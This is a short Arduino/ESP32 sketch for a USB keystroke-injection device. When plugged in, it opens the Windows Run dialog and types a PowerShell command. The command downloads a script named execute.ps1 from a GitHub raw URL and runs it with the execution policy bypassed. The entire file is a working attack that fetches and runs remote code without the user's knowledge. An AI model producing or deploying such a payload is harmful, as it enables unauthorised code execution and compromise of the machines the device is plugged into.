#include <USB.h>
#include <USBHIDKeyboard.h>
#include "keyboardLayout/Keyboard_de_DE.h"

USBHIDKeyboard Keyboard;
void typeString(const char* str, unsigned int delayBetweenKeys = 20) {
  for (size_t i = 0; i < strlen(str); i++) {
    char c = str[i];
    Keyboard.press(c);
    delay(10);
    Keyboard.release(c);
    delay(delayBetweenKeys);
  }
}

void setup() {
  USB.begin();
  Keyboard.begin(KeyboardLayout_de_DE);
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(500);
  const char* cmd = "powershell.exe -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p\"";
  typeString(cmd, 15);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.end();
}

void loop() {
}